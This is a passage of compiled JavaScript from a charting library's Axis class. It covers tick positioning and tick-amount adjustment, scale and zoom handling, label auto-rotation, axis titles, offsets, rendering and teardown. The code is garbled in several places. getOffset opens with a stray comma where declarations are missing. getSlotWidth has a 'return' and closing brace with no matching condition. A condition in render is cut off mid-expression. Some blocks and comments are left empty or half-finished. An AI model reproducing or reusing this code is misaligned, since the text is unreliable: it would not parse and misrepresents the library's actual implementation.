(this.max + minPointOffset <\n                    tickPositions[tickPositions.length - 1]) {\n                    tickPositions.pop();\n                }\n            }\n            if (tickPositions.length === 0 &&\n                defined(roundedMin) &&\n               !this.options.tickPositions) {\n                tickPositions.push((roundedMax + roundedMin) / 2);\n            }\n        }\n    };\nAxis.prototype.alignToOthers = function () {\n        var axis = this, others = // Whether there is another axis to pair with this one\n         {}, options = axis.options;\n        var hasOther;\n        if (\n        this.chart.options.chart.alignTicks!== false &&\n            options.alignTicks &&\n            options.startOnTick!== false &&\n            options.endOnTick!== false &&\n           !axis.logarithmic) {\n            this.chart[this.coll].forEach(function (axis) {\n                var otherOptions = axis.options, horiz = axis.horiz, key = [\n                    horiz? otherOptions.left : otherOptions.top,\n                    otherOptions.width,\n                    otherOptions.height,\n                    otherOptions.pane\n                ].join(',');\n                if (axis.series.length) { // #4442\n                    if (others[key]) {\n                        hasOther = true; // #4201\n                    }\n                    else {\n                        others[key] = 1;\n                    }\n                }\n            });\n        }\n        return hasOther;\n    };\nAxis.prototype.getTickAmount = function () {\n        var axis = this, options = this.options, tickPixelInterval = options.tickPixelInterval;\n        var tickAmount = options.tickAmount;\n        if (!defined(options.tickInterval) &&\n           !tickAmount &&\n            this.len < tickPixelInterval &&\n           !this.isRadial &&\n           !axis.logarithmic &&\n            options.startOnTick &&\n            options.endOnTick) {\n            tickAmount = 2;\n        }\n        if (!tickAmount && this.alignToOthers()) {\n            tickAmount = Math.ceil(this.len / tickPixelInterval) + 1;\n        }\n        if (tickAmount < 4) {\n            this.finalTickAmt = tickAmount;\n            tickAmount = 5;\n        }\n        this.tickAmount = tickAmount;\n    };\nAxis.prototype.adjustTickAmount = function () {\n        var axis = this, axisOptions = axis.options, tickInterval = axis.tickInterval, tickPositions = axis.tickPositions, tickAmount = axis.tickAmount, finalTickAmt = axis.finalTickAmt, currentTickAmount = tickPositions && tickPositions.length, threshold = pick(axis.threshold, axis.softThreshold? 0 : null);\n        var len, i;\n        if (axis.hasData() && isNumber(axis.min) && isNumber(axis.max)) { // #14769\n            if (currentTickAmount < tickAmount) {\n                while (tickPositions.length < tickAmount) {\n                    // Extend evenly for both sides unless we're on the\n                    // threshold (#3965)\n                    if (tickPositions.length % 2 ||\n                        axis.min === threshold) {\n                        // to the end\n                        tickPositions.push(correctFloat(tickPositions[tickPositions.length - 1] +\n                            tickInterval));\n                    }\n                    else {\n                        // to the start\n                        tickPositions.unshift(correctFloat(tickPositions[0] - tickInterval));\n                    }\n                }\n                axis.transA *= (currentTickAmount - 1) / (tickAmount - 1);\n                axis.min = axisOptions.startOnTick?\n                    tickPositions[0] :\n                    Math.min(axis.min, tickPositions[0]);\n                axis.max = axisOptions.endOnTick?\n                    tickPositions[tickPositions.length - 1] :\n                    Math.max(axis.max, tickPositions[tickPositions.length - 1]);\n            }\n            else if (currentTickAmount > tickAmount) {\n                axis.tickInterval *= 2;\n                axis.setTickPositions();\n            }\n            if (defined(finalTickAmt)) {\n                i = len = tickPositions.length;\n                while (i--) {\n                    if (\n                    (finalTickAmt === 3 && i % 2 === 1) ||\n                        // Remove all but first and last\n                        (finalTickAmt <= 2 && i > 0 && i < len - 1)) {\n                        tickPositions.splice(i, 1);\n                    }\n                }\n                axis.finalTickAmt = void 0;\n            }\n        }\n    };\nAxis.prototype.setScale = function () {\n        var axis = this;\n        var isDirtyData = false, isXAxisDirty = false;\n        axis.series.forEach(function (series) {\n            isDirtyData = isDirtyData || series.isDirtyData || series.isDirty;\n            // When x axis is dirty, we need new data extremes for y as\n            // well:\n            isXAxisDirty = (isXAxisDirty ||\n                (series.xAxis && series.xAxis.isDirty) ||\n                false);\n        });\n        // set the new axisLength\n        axis.setAxisSize();\n        var isDirtyAxisLength = axis.len!== (axis.old && axis.old.len);\n        // do we really need to go through all this?\n        if (isDirtyAxisLength ||\n            isDirtyData ||\n            isXAxisDirty ||\n            axis.isLinked ||\n            axis.forceRedraw ||\n            axis.userMin!== (axis.old && axis.old.userMin) ||\n            axis.userMax!== (axis.old && axis.old.userMax) ||\n            axis.alignToOthers()) {\n            if (axis.stacking) {\n                axis.stacking.resetStacks();\n            }\n            axis.forceRedraw = false;\n            // get data extremes if needed\n            axis.getSeriesExtremes();\n            axis.setTickInterval();\n            // Mark as dirty if it is not already set to dirty and extremes have\n            if (!axis.isDirty) {\n                axis.isDirty =\n                    isDirtyAxisLength ||\n                        axis.min!== (axis.old && axis.old.min) ||\n                        axis.max!== (axis.old && axis.old.max);\n            }\n        }\n        else if (axis.stacking) {\n            axis.stacking.cleanStacks();\n        }\n        if (isDirtyData && axis.panningState) {\n            axis.panningState.isDirty = true;\n        }\n        fireEvent(this, 'afterSetScale');\n    };\nAxis.prototype.setExtremes = function (newMin, newMax, redraw, animation, eventArguments) {\n        var axis = this, chart = axis.chart;\n        axis.series.forEach(function (serie) {\n            delete serie.kdTree;\n        });\n        // Extend the arguments with min and max\n        eventArguments = extend(eventArguments, {\n            min: newMin,\n            max: newMax\n        });\n        // Fire the event\n        fireEvent(axis,'setExtremes', eventArguments, function () {\n            axis.userMin = newMin;\n            axis.userMax = newMax;\n            axis.eventArgs = eventArguments;\n            if (redraw) {\n                chart.redraw(animation);\n            }\n        });\n    };\nAxis.prototype.zoom = function (newMin, newMax) {\n        var axis = this, dataMin = this.dataMin, dataMax = this.dataMax, options = this.options, min = Math.min(dataMin, pick(options.min, dataMin)), max = Math.max(dataMax, pick(options.max, dataMax)), evt = {\n            newMin: newMin,\n            newMax: newMax\n        };\n        fireEvent(this, 'zoom', evt, function (e) {\n            // Use e.newMin and e.newMax - event handlers may have altered them\n            var newMin = e.newMin, newMax = e.newMax;\n            if (newMin!== axis.min || newMax!== axis.max) { // #5790\n                if (!axis.allowZoomOutside) {\n                    // #6014, sometimes newMax will be smaller than min (or\n                    // newMin will be larger than max).\n                    if (defined(dataMin)) {\n                        if (newMin < min) {\n                            newMin = min;\n                        }\n                        if (newMin > max) {\n                            newMin = max;\n                        }\n                    }\n                    if (defined(dataMax)) {\n                        if (newMax < min) {\n                            newMax = min;\n                        }\n                        if (newMax > max) {\n                            newMax = max;\n                        }\n                    }\n                }\n                // In full view, displaying the reset zoom button is not\n                // required\n                axis.displayBtn = (typeof newMin!== 'undefined' ||\n                    typeof newMax!== 'undefined');\n                // Do it\n                axis.setExtremes(newMin, newMax, false, void 0, { trigger: 'zoom' });\n            }\n            e.zoomed = true;\n        });\n        return evt.zoomed;\n    };\nAxis.prototype.setAxisSize = function () {\n        var chart = this.chart, options = this.options, \n        // [top, right, bottom, left]\n        offsets = options.offsets || [0, 0, 0, 0], horiz = this.horiz, \n        width = this.width = Math.round(relativeLength(pick(options.width, chart.plotWidth - offsets[3] + offsets[1]), chart.plotWidth)), height = this.height = Math.round(relativeLength(pick(options.height, chart.plotHeight - offsets[0] + offsets[2]), chart.plotHeight)), top = this.top = Math.round(relativeLength(pick(options.top, chart.plotTop + offsets[0]), chart.plotHeight, chart.plotTop)), left = this.left = Math.round(relativeLength(pick(options.left, chart.plotLeft + offsets[3]), chart.plotWidth, chart.plotLeft));\n        this.bottom = chart.chartHeight - height - top;\n        this.right = chart.chartWidth - width - left;\n        this.len = Math.max(horiz? width : height, 0); // Math.max fixes #905\n    };\nAxis.prototype.getExtremes = function () {\n        var axis = this, log = axis.logarithmic;\n        return {\n            min: log?\n                correctFloat(log.lin2log(axis.min)) :\n                axis.min,\n            max: log?\n                correctFloat(log.lin2log(axis.max)) :\n                axis.max,\n            dataMin: axis.dataMin,\n            dataMax: axis.dataMax,\n            userMin: axis.userMin,\n            userMax: axis.userMax\n        };\n    };\nAxis.prototype.getThreshold = function (threshold) {\n        var axis = this, log = axis.logarithmic, realMin = log? log.lin2log(axis.min) : axis.min, realMax = log? log.lin2log(axis.max) : axis.max;\n        if (threshold === null || threshold === -Infinity) {\n            threshold = realMin;\n        }\n        else if (threshold === Infinity) {\n            threshold = realMax;\n        }\n        else if (realMin > threshold) {\n            threshold = realMin;\n        }\n        else if (realMax < threshold) {\n            threshold = realMax;\n        }\n        return axis.translate(threshold, 0, 1, 0, 1);\n    };\nAxis.prototype.autoLabelAlign = function (rotation) {\n        var angle = (pick(rotation, 0) - (this.side * 90) + 720) % 360, evt = { align: 'center' };\n        fireEvent(this, 'autoLabelAlign', evt, function (e) {\n            if (angle > 15 && angle < 165) {\n                e.align = 'right';\n            }\n            else if (angle > 195 && angle < 345) {\n                e.align = 'left';\n            }\n        });\n        return evt.align;\n    };\nAxis.prototype.tickSize = function (prefix) {\n        var options = this.options, tickWidth = pick(options[prefix === 'tick'? 'tickWidth' :'minorTickWidth'], \n        // Default to 1 on linear and datetime X axes\n        prefix === 'tick' && this.isXAxis &&!this.categories? 1 : 0);\n        var tickLength = options[prefix === 'tick'? 'tickLength' :'minorTickLength'], tickSize;\n        if (tickWidth && tickLength) {\n            // Negate the length\n            if (options[prefix + 'Position'] === 'inside') {\n                tickLength = -tickLength;\n            }\n            tickSize = [tickLength, tickWidth];\n        }\n        var e = { tickSize: tickSize };\n        fireEvent(this, 'afterTickSize', e);\n        return e.tickSize;\n    };\nAxis.prototype.labelMetrics = function () {\n        var index = this.tickPositions && this.tickPositions[0] || 0;\n        return this.chart.renderer.fontMetrics(this.options.labels.style.fontSize, this.ticks[index] && this.ticks[index].label);\n    };\nAxis.prototype.unsquish = function () {\n        var labelOptions = this.options.labels, horiz = this.horiz, tickInterval = this.tickInterval, slotSize = this.len / (((this.categories? 1 : 0) +\n            this.max -\n            this.min) /\n            tickInterval), rotationOption = labelOptions.rotation, labelMetrics = this.labelMetrics(), range = Math.max(this.max - this.min, 0), \n        getStep = function (spaceNeeded) {\n            var step = spaceNeeded / (slotSize || 1);\n            step = step > 1? Math.ceil(step) : 1;\n            // Guard for very small or negative angles (#9835)\n            if (step * tickInterval > range &&\n                spaceNeeded!== Infinity &&\n                slotSize!== Infinity &&\n                range) {\n                step = Math.ceil(range / tickInterval);\n            }\n            return correctFloat(step * tickInterval);\n        };\n        var newTickInterval = tickInterval, rotation, step, bestScore = Number.MAX_VALUE, autoRotation;\n        if (horiz) {\n            if (!labelOptions.staggerLines &&!labelOptions.step) {\n                if (isNumber(rotationOption)) {\n                    autoRotation = [rotationOption];\n                }\n                else if (slotSize < labelOptions.autoRotationLimit) {\n                    autoRotation = labelOptions.autoRotation;\n                }\n            }\n            if (autoRotation) {\n                // Loop over the given autoRotation options, and determine\n                autoRotation.forEach(function (rot) {\n                    var score;\n                    if (rot === rotationOption ||\n                        (rot && rot >= -90 && rot <= 90)) { // #3891\n                        step = getStep(Math.abs(labelMetrics.h / Math.sin(deg2rad * rot)));\n                        score = step + Math.abs(rot / 360);\n                        if (score < bestScore) {\n                            bestScore = score;\n                            rotation = rot;\n                            newTickInterval = step;\n                        }\n                    }\n                });\n            }\n        }\n        else if (!labelOptions.step) { // #4411\n            newTickInterval = getStep(labelMetrics.h);\n        }\n        this.autoRotation = autoRotation;\n        this.labelRotation = pick(rotation, isNumber(rotationOption)? rotationOption : 0);\n        return newTickInterval;\n    };\nAxis.prototype.getSlotWidth = function (tick) {\n        // #5086, #1580, #1931\n        var chart = this.chart, horiz = this.horiz, labelOptions = this.options.labels, slotCount = Math.max(this.tickPositions.length - (this.categories? 0 : 1), 1), marginLeft = chart.margin[3];\n        // Used by grid axis\n            return tick.slotWidth;\n        }\n        if (horiz && labelOptions.step < 2) {\n            if (labelOptions.rotation) { // #4415\n                return 0;\n            }\n            return ((this.staggerLines || 1) * this.len) / slotCount;\n        }\n        if (!horiz) {\n            // #7028\n            var cssWidth = labelOptions.style.width;\n            if (cssWidth!== void 0) {\n                return parseInt(String(cssWidth), 10);\n            }\n            if (marginLeft) {\n                return marginLeft - chart.spacing[3];\n            }\n        }\n        return chart.chartWidth * 0.33;\n    };\nAxis.prototype.renderUnsquish = function () {\n        var chart = this.chart, renderer = chart.renderer, tickPositions = this.tickPositions, ticks = this.ticks, labelOptions = this.options.labels, labelStyleOptions = labelOptions.style, horiz = this.horiz, slotWidth = this.getSlotWidth(), innerWidth = Math.max(1, Math.round(slotWidth - 2 * labelOptions.padding)), attr = {}, labelMetrics = this.labelMetrics(), textOverflowOption = labelStyleOptions.textOverflow;\n        var commonWidth, commonTextOverflow, maxLabelLength = 0, label, i, pos;\n        // Set rotation option unless it is \"auto\", like in gauges\n        if (!isString(labelOptions.rotation)) {\n            // #4443\n            attr.rotation = labelOptions.rotation || 0;\n        }\n        // Get the longest label length\n        tickPositions.forEach(function (tickPosition) {\n            var tick = ticks[tickPosition];\n            if (tick.movedLabel) {\n                tick.replaceMovedLabel();\n            }\n            if (tick &&\n                tick.label &&\n                tick.label.textPxLength > maxLabelLength) {\n                maxLabelLength = tick.label.textPxLength;\n            }\n        });\n        this.maxLabelLength = maxLabelLength;\n        // Handle auto rotation on horizontal axis\n        if (this.autoRotation) {\n            // Apply rotation only if the label is too wide for the slot, and\n            // the label is wider than its height.\n            if (maxLabelLength > innerWidth &&\n                maxLabelLength > labelMetrics.h) {\n                attr.rotation = this.labelRotation;\n            }\n            else {\n                this.labelRotation = 0;\n            }\n        }\n        else if (slotWidth) {\n            // For word-wrap or ellipsis\n            commonWidth = innerWidth;\n            if (!textOverflowOption) {\n                commonTextOverflow = 'clip';\n                i = tickPositions.length;\n                while (!horiz && i--) {\n                    pos = tickPositions[i];\n                    label = ticks[pos].label;\n                    if (label) {\n                        if (label.styles &&\n                            label.styles.textOverflow === 'ellipsis') {\n                            label.css({ textOverflow: 'clip' });\n                        }\n                        else if (label.textPxLength > slotWidth) {\n                            label.css({ width: slotWidth + 'px' });\n                        }\n                        if (label.getBBox().height > (this.len / tickPositions.length -\n                            (labelMetrics.h - labelMetrics.f))) {\n                            label.specificTextOverflow = 'ellipsis';\n                        }\n                    }\n                }\n            }\n        }\n        if (attr.rotation) {\n            commonWidth = (maxLabelLength > chart.chartHeight * 0.5?\n                chart.chartHeight * 0.33 :\n                maxLabelLength);\n            if (!textOverflowOption) {\n                commonTextOverflow = 'ellipsis';\n            }\n        }\n        this.labelAlign = labelOptions.align ||\n            this.autoLabelAlign(this.labelRotation);\n        if (this.labelAlign) {\n            attr.align = this.labelAlign;\n        }\n        tickPositions.forEach(function (pos) {\n            var tick = ticks[pos], label = tick && tick.label, widthOption = labelStyleOptions.width, css = {};\n            if (label) {\n                label.attr(attr);\n                if (tick.shortenLabel) {\n                    tick.shortenLabel();\n                }\n                else if (commonWidth &&\n                   !widthOption &&\n                    labelStyleOptions.whiteSpace!== 'nowrap' &&\n                    (\n                    // Speed optimizing, #7656\n                    commonWidth < label.textPxLength ||\n                        label.element.tagName === 'SPAN')) {\n                    css.width = commonWidth + 'px';\n                    if (!textOverflowOption) {\n                        css.textOverflow = (label.specificTextOverflow ||\n                            commonTextOverflow);\n                    }\n                    label.css(css);\n                    // Reset previously shortened label (#8210)\n                }\n                else if (label.styles &&\n                    label.styles.width &&\n                   !css.width &&\n                   !widthOption) {\n                    label.css({ width: null });\n                }\n                delete label.specificTextOverflow;\n                tick.rotation = attr.rotation;\n            }\n        }, this);\n        // Note: Why is this not part of getLabelPosition?\n        this.tickRotCorr = renderer.rotCorr(labelMetrics.b, this.labelRotation || 0, this.side!== 0);\n    };\nAxis.prototype.hasData = function () {\n        return this.series.some(function (s) {\n            return s.hasData();\n        }) ||\n            (this.options.showEmpty &&\n                defined(this.min) &&\n                defined(this.max));\n    };\nAxis.prototype.addTitle = function (display) {\n        var axis = this, renderer = axis.chart.renderer, horiz = axis.horiz, opposite = axis.opposite, options = axis.options, axisTitleOptions = options.title, styledMode = axis.chart.styledMode;\n        var textAlign;\n        if (!axis.axisTitle) {\n            textAlign = axisTitleOptions.textAlign;\n            if (!textAlign) {\n                textAlign = (horiz? {\n                    low: 'left',\n                    middle: 'center',\n                    high: 'right'\n                } : {\n                    low: opposite? 'right' : 'left',\n                    middle: 'center',\n                    high: opposite? 'left' : 'right'\n                })[axisTitleOptions.align];\n            }\n            axis.axisTitle = renderer\n               .text(axisTitleOptions.text || '', 0, 0, axisTitleOptions.useHTML)\n               .attr({\n                zIndex: 7,\n                rotation: axisTitleOptions.rotation,\n                align: textAlign\n            })\n               .addClass('highcharts-axis-title');\n            // #7814, don't mutate style option\n            if (!styledMode) {\n                axis.axisTitle.css(merge(axisTitleOptions.style));\n            }\n            axis.axisTitle.add(axis.axisGroup);\n            axis.axisTitle.isNew = true;\n        }\n        // Max width defaults to the length of the axis\n        if (!styledMode &&\n           !axisTitleOptions.style.width &&\n           !axis.isRadial) {\n            axis.axisTitle.css({\n                width: axis.len + 'px'\n            });\n        }\n        // hide or show the title depending on whether showEmpty is set\n        axis.axisTitle[display?'show' : 'hide'](display);\n    };\nAxis.prototype.generateTick = function (pos) {\n        var axis = this, ticks = axis.ticks;\n        if (!ticks[pos]) {\n            ticks[pos] = new Tick(axis, pos);\n        }\n        else {\n        }\n    };\nAxis.prototype.getOffset = function () {\n        var _this = this;\n       , renderer = chart.renderer, invertedSide = (chart.inverted &&!axis.isZAxis?\n            [1, 0, 3, 2][side] :\n            side), hasData = axis.hasData(), axisTitleOptions = options.title, labelOptions = options.labels, axisOffset = chart.axisOffset, clipOffset = chart.clipOffset, directionFactor = [-1, 1, 1, -1][side], className = options.className;\n        var showAxis, titleOffset = 0, titleOffsetOption, titleMargin = 0, labelOffset = 0, // reset\n        labelOffsetPadded, lineHeightCorrection;\n        // For reuse in Axis.render\n        axis.showAxis = showAxis = hasData || options.showEmpty;\n        // Set/reset staggerLines\n        axis.staggerLines = (axis.horiz && labelOptions.staggerLines) || void 0;\n        if (!axis.axisGroup) {\n            var createGroup = function (name, suffix, zIndex) { return renderer.g(name)\n               .attr({ zIndex: zIndex })\n               .addClass(\"highcharts-\" + coll.toLowerCase() + suffix + \" \" +\n                (_this.isRadial? \"highcharts-radial-axis\" + suffix + \" \" : '') +\n                (className || ''))\n               .add(axisParent); };\n            axis.gridGroup = createGroup('grid', '-grid', options.gridZIndex);\n            axis.axisGroup = createGroup('axis', '', options.zIndex);\n            axis.labelGroup = createGroup('axis-labels', '-labels', labelOptions.zIndex);\n        }\n        if (hasData || axis.isLinked) {\n            tickPositions.forEach(function (pos) {\n                // i is not used here, but may be used in overrides\n                axis.generateTick(pos);\n            });\n            axis.renderUnsquish();\n            // Left side must be align: right and right side must\n            // have align: left for labels\n            axis.reserveSpaceDefault = (side === 0 ||\n                side === 2 ||\n                { 1: 'left', 3: 'right' }[side] === axis.labelAlign);\n            if (pick(labelOptions.reserveSpace, axis.labelAlign === 'center'? true : null, axis.reserveSpaceDefault)) {\n                tickPositions.forEach(function (pos) {\n                    // get the highest offset\n                    labelOffset = Math.max(ticks[pos].getLabelSize(), labelOffset);\n                });\n            }\n            if (axis.staggerLines) {\n                labelOffset *= axis.staggerLines;\n            }\n            axis.labelOffset = labelOffset * (axis.opposite? -1 : 1);\n        }\n        else { // doesn't have data\n            objectEach(ticks, function (tick, n) {\n                tick.destroy();\n                delete ticks[n];\n            });\n        }\n        if (axisTitleOptions &&\n            axisTitleOptions.text &&\n            axisTitleOptions.enabled!== false) {\n            axis.addTitle(showAxis);\n            if (showAxis && axisTitleOptions.reserveSpace!== false) {\n                axis.titleOffset = titleOffset =\n                    axis.axisTitle.getBBox()[horiz? 'height' : 'width'];\n                titleOffsetOption = axisTitleOptions.offset;\n                titleMargin = defined(titleOffsetOption)?\n                    0 :\n                    pick(axisTitleOptions.margin, horiz? 5 : 10);\n            }\n        }\n        // Render the axis line\n        axis.renderLine();\n        axis.offset = directionFactor * pick(options.offset, axisOffset[side]? axisOffset[side] + (options.margin || 0) : 0);\n        if (side === 0) {\n            lineHeightCorrection = -axis.labelMetrics().h;\n        }\n        else if (side === 2) {\n            lineHeightCorrection = axis.tickRotCorr.y;\n        }\n        else {\n            lineHeightCorrection = 0;\n        }\n        // Find the padded label offset\n        labelOffsetPadded = Math.abs(labelOffset) + titleMargin;\n        if (labelOffset) {\n            labelOffsetPadded -= lineHeightCorrection;\n            labelOffsetPadded += directionFactor * (horiz?\n                pick(labelOptions.y, axis.tickRotCorr.y + directionFactor * 8) :\n                labelOptions.x);\n        }\n        axis.axisTitleMargin = pick(titleOffsetOption, labelOffsetPadded);\n        if (axis.getMaxLabelDimensions) {\n            axis.maxLabelDimensions = axis.getMaxLabelDimensions(ticks, tickPositions);\n        }\n        if (coll!== 'colorAxis') {\n            var tickSize = this.tickSize('tick');\n            axisOffset[side] = Math.max(axisOffset[side], (axis.axisTitleMargin || 0) + titleOffset +\n            tickPositions && tickPositions.length && tickSize?\n                tickSize[0] + directionFactor * axis.offset :\n                0 // #4866\n            );\n            var clip =!axis.axisLine || options.offset?\n                0 :\n                // #4308, #4371:\n                Math.floor(axis.axisLine.strokeWidth() / 2) * 2;\n            clipOffset[invertedSide] =\n                Math.max(clipOffset[invertedSide], clip);\n        }\n        fireEvent(this, 'afterGetOffset');\n    };\nAxis.prototype.getLinePath = function (lineWidth) {\n        var chart = this.chart, opposite = this.opposite, offset = this.offset, horiz = this.horiz, lineLeft = this.left + (opposite? this.width : 0) + offset, lineTop = chart.chartHeight - this.bottom -\n            (opposite? this.height : 0) + offset;\n        if (opposite) {\n        }\n        return chart.renderer\n           .crispLine([\n            [\n                'M',\n                horiz?\n                    this.left :\n                    lineLeft,\n                horiz?\n                    lineTop :\n                    this.top\n            ],\n            [\n                'L',\n                horiz?\n                    chart.chartWidth - this.right :\n                    lineLeft,\n                horiz?\n                    lineTop :\n                    chart.chartHeight - this.bottom\n            ]\n        ], lineWidth);\n    };\nAxis.prototype.renderLine = function () {\n        if (!this.axisLine) {\n            this.axisLine = this.chart.renderer.path()\n               .addClass('highcharts-axis-line')\n               .add(this.axisGroup);\n            if (!this.chart.styledMode) {\n                this.axisLine.attr({\n                    stroke: this.options.lineColor,\n                   'stroke-width': this.options.lineWidth,\n                    zIndex: 7\n                });\n            }\n        }\n    };\nAxis.prototype.getTitlePosition = function () {\n        var horiz = this.horiz, axisLeft = this.left, axisTop = this.top, axisLength = this.len, axisTitleOptions = this.options.title, margin = horiz? axisLeft : axisTop, opposite = this.opposite, offset = this.offset, xOption = axisTitleOptions.x, yOption = axisTitleOptions.y, axisTitle = this.axisTitle, fontMetrics = this.chart.renderer.fontMetrics(axisTitleOptions.style.fontSize, axisTitle), \n        // The part of a multiline text that is below the baseline of the\n        textHeightOvershoot = Math.max(axisTitle.getBBox(null, 0).height - fontMetrics.h - 1, 0), \n        alongAxis = {\n            low: margin + (horiz? 0 : axisLength),\n            middle: margin + axisLength / 2,\n            high: margin + (horiz? axisLength : 0)\n        }[axisTitleOptions.align], \n        offAxis = (horiz? axisTop + this.height : axisLeft) +\n            (horiz? 1 : -1) * // horizontal axis reverses the margin\n                (opposite? -1 : 1) * // so does opposite axes\n                this.axisTitleMargin +\n            [\n                -textHeightOvershoot,\n                textHeightOvershoot,\n                fontMetrics.f,\n                -textHeightOvershoot // left\n            ][this.side], titlePosition = {\n            x: horiz?\n                alongAxis + xOption :\n                offAxis + (opposite? this.width : 0) + offset + xOption,\n            y: horiz?\n                offAxis + yOption - (opposite? this.height : 0) + offset :\n                alongAxis + yOption\n        };\n        fireEvent(this, 'afterGetTitlePosition', { titlePosition: titlePosition });\n        return titlePosition;\n    };\nAxis.prototype.renderMinorTick = function (pos, slideIn) {\n        var axis = this;\n        var minorTicks = axis.minorTicks;\n        if (!minorTicks[pos]) {\n            minorTicks[pos] = new Tick(axis, pos,'minor');\n        }\n        if (slideIn && minorTicks[pos].isNew) {\n            minorTicks[pos].render(null, true);\n        }\n        minorTicks[pos].render(null, false, 1);\n    };\nAxis.prototype.renderTick = function (pos, i, slideIn) {\n        var axis = this, isLinked = axis.isLinked, ticks = axis.ticks;\n        if (!isLinked ||\n            (pos >= axis.min && pos <= axis.max) ||\n            (axis.grid && axis.grid.isColumn)) {\n            if (!ticks[pos]) {\n                ticks[pos] = new Tick(axis, pos);\n            }\n            if (slideIn && ticks[pos].isNew) {\n                ticks[pos].render(i, true, -1);\n            }\n            ticks[pos].render(i);\n        }\n    };\nAxis.prototype.render = function () {\n        var axis = this, chart = axis.chart, log = axis.logarithmic, renderer = chart.renderer, options = axis.options, isLinked = axis.isLinked, tickPositions = axis.tickPositions, axisTitle = axis.axisTitle, ticks = axis.ticks, minorTicks = axis.minorTicks, alternateBands = axis.alternateBands, stackLabelOptions = options.stackLabels, alternateGridColor = options.alternateGridColor, tickmarkOffset = axis.tickmarkOffset, axisLine = axis.axisLine, showAxis = axis.showAxis, animation = animObject(renderer.globalAnimation);\n        var from, to;\n        // Reset\n        axis.labelEdge.length = 0;\n        axis.overlap = false;\n        [ticks, minorTicks, alternateBands].forEach(function (coll) {\n            objectEach(coll, function (tick) {\n                tick.isActive = false;\n            });\n        });\n        if (axis.hasData() || isLinked) {\n            var slideInTicks_1 = axis.chart.hasRendered &&\n                axis.old && isNumber(axis.old.min);\n            if (axis.minorTickInterval &&!axis.categories) {\n                axis.getMinorTickPositions().forEach(function (pos) {\n                    axis.renderMinorTick(pos, slideInTicks_1);\n                });\n            }\n            if (tickPositions.length) { // #1300\n                tickPositions.forEach(function (pos, i) {\n                    axis.renderTick(pos, i, slideInTicks_1);\n                });\n                if (tickmarkOffset && (axis.min === 0 || axis.single)) {\n                    if (!ticks[-1]) {\n                        ticks[-1] = new Tick(axis, -1, null, true);\n                    }\n                    ticks[-1].render(-1);\n                }\n            }\n            if (alternateGridColor) {\n                tickPositions.forEach(function (pos, i) {\n                    to = typeof tickPositions[i + 1]!== 'undefined'?\n                        tickPositions[i + 1] + tickmarkOffset :\n                        axis.max - tickmarkOffset;\n                    if (i % 2 === 0 &&\n                        pos < axis.max &&\n                        to <= axis.max + (chart.polar?\n                            -tickmarkOffset :\n                        if (!alternateBands[pos]) {\n                            // Should be imported from PlotLineOrBand.js, but\n                            alternateBands[pos] = new H.PlotLineOrBand(axis);\n                        }\n                        alternateBands[pos].options = {\n                            from: log? log.lin2log(from) : from,\n                            to: log? log.lin2log(to) : to,\n                            color: alternateGridColor,\n                            className: 'highcharts-alternate-grid'\n                        };\n                        alternateBands[pos].render();\n                        alternateBands[pos].isActive = true;\n                    }\n                });\n            }\n            if (!axis._addedPlotLB) { // only first time\n                axis._addedPlotLB = true;\n                (options.plotLines || [])\n                   .concat(options.plotBands || [])\n                   .forEach(function (plotLineOptions) {\n                    axis.addPlotBandOrLine(plotLineOptions);\n                });\n            }\n        } // end if hasData\n        [ticks, minorTicks, alternateBands].forEach(function (coll) {\n            var forDestruction = [], delay = animation.duration, destroyInactiveItems = function () {\n                var i = forDestruction.length;\n                while (i--) {\n                    // When resizing rapidly, the same items\n                    // may be destroyed in different timeouts,\n                    if (coll[forDestruction[i]] &&\n                       !coll[forDestruction[i]].isActive) {\n                        coll[forDestruction[i]].destroy();\n                        delete coll[forDestruction[i]];\n                    }\n                }\n            };\n            objectEach(coll, function (tick, pos) {\n                if (!tick.isActive) {\n                    tick.render(pos, false, 0);\n                    tick.isActive = false;\n                    forDestruction.push(pos);\n                }\n            });\n            syncTimeout(destroyInactiveItems, coll === alternateBands ||\n               !chart.hasRendered ||\n               !delay?\n                0 :\n                delay);\n        });\n        // Set the axis line path\n        if (axisLine) {\n            axisLine[axisLine.isPlaced? 'animate' : 'attr']({\n                d: this.getLinePath(axisLine.strokeWidth())\n            });\n            axisLine.isPlaced = true;\n            // Show or hide the line depending on options.showEmpty\n            axisLine[showAxis?'show' : 'hide'](showAxis);\n        }\n        if (axisTitle && showAxis) {\n            var titleXy = axis.getTitlePosition();\n            if (isNumber(titleXy.y)) {\n                axisTitle[axisTitle.isNew? 'attr' : 'animate'](titleXy);\n                axisTitle.isNew = false;\n            }\n            else {\n                axisTitle.attr('y', -9999);\n                axisTitle.isNew = true;\n            }\n        }\n        if (stackLabelOptions && stackLabelOptions.enabled && axis.stacking) {\n            axis.stacking.renderStackTotals();\n        }\n        axis.old = {\n            len: axis.len,\n            max: axis.max,\n            min: axis.min,\n            transA: axis.transA,\n            userMax: axis.userMax,\n            userMin: axis.userMin\n        };\n        axis.isDirty = false;\n        fireEvent(this, 'afterRender');\n    };\nAxis.prototype.redraw = function () {\n        if (this.visible) {\n            // render the axis\n            this.render();\n            // move plot lines and bands\n            this.plotLinesAndBands.forEach(function (plotLine) {\n                plotLine.render();\n            });\n        }\n        this.series.forEach(function (series) {\n            series.isDirty = true;\n        });\n    };\nAxis.prototype.getKeepProps = function () {\n        return (this.keepProps || Axis.keepProps);\n    };\nAxis.prototype.destroy = function (keepEvents) {\n        var axis = this, plotLinesAndBands = axis.plotLinesAndBands, eventOptions = this.eventOptions;\n        fireEvent(this, 'destroy', { keepEvents: keepEvents });\n        // Remove the events\n        if (!keepEvents) {\n            removeEvent(axis);\n        }\n        [axis.ticks, axis.minorTicks, axis.alternateBands].forEach(function (coll) {\n            destroyObjectProperties(coll);\n        });\n        if (plotLinesAndBands) {\n            var i = plotLinesAndBands.length;\n            while (i--) { // #1975\n                plotLinesAndBands[i].destroy();\n            }\n        }\n        // Destroy elements\n        ['axisLine', 'axisTitle', 'axisGroup',\n            'gridGroup', 'labelGroup', 'cross','scrollbar'].forEach(function (prop) {\n            if (axis[prop]) {\n                axis[prop] = axis[prop].destroy();\n            }\n        });\n        for (var plotGroup in axis.plotLinesAndBandsGroups) { // eslint-disable-line guard-for-in\n            axis.plotLinesAndBandsGroups[plotGroup] =\n                axis.plotLinesAndBandsGroups[plotGroup].destroy();\n        }\n        objectEach(axis, function (val, key) {\n            if (axis.getKeepProps().indexOf(key) === -1) {\n                delete axis[key];\n            }\n        });\n        this.eventOptions = eventOptions;\n    };\nAxis.prototype.drawCrosshair = function (e, point) {\n        var options = this.crosshair, snap = pick(options && 